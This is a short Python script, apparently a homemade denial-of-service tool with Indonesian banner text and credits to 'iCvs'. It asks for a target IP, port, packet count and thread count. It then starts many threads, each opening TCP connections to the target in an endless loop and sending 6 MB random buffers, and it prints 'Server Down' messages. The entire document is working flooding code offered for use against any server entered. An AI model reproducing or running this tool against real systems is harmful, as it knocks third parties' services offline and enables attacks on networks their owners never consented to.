# Coding Time By Usage
# Tools Usage By : Usage
# Tools Credit By : Usage
# HELLO

# Import Module
import random
import socket
import threading
# Info Tools [ Usage]
print("------------------------------------------------")
print("[+] Tools Used By : iCvs")
print("[+] Credit Tools : iCvs")
print("[+]Pakai Tools Dengan Baik ")
print("------------------------------------------------")

ip = str(input("[/] Enter RDP IP : "))
port = int(input("[/] Enter RDP Port (80)   : "))
times = int(input("[/] Enter Packet : "))
threads = int(input("[/] Enter Thread (9024) : "))

def run():
    data = random._urandom(6000000)
    i = random.choice(("[#]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +" Sent!!!")
        except socket.error:
            s.close()
            print("[!]  DDoS Running (Server Down) => ",ip," With Port : ",port,"!")

for y in range(threads):
    th = threading.Thread(target = run)
    th.start()
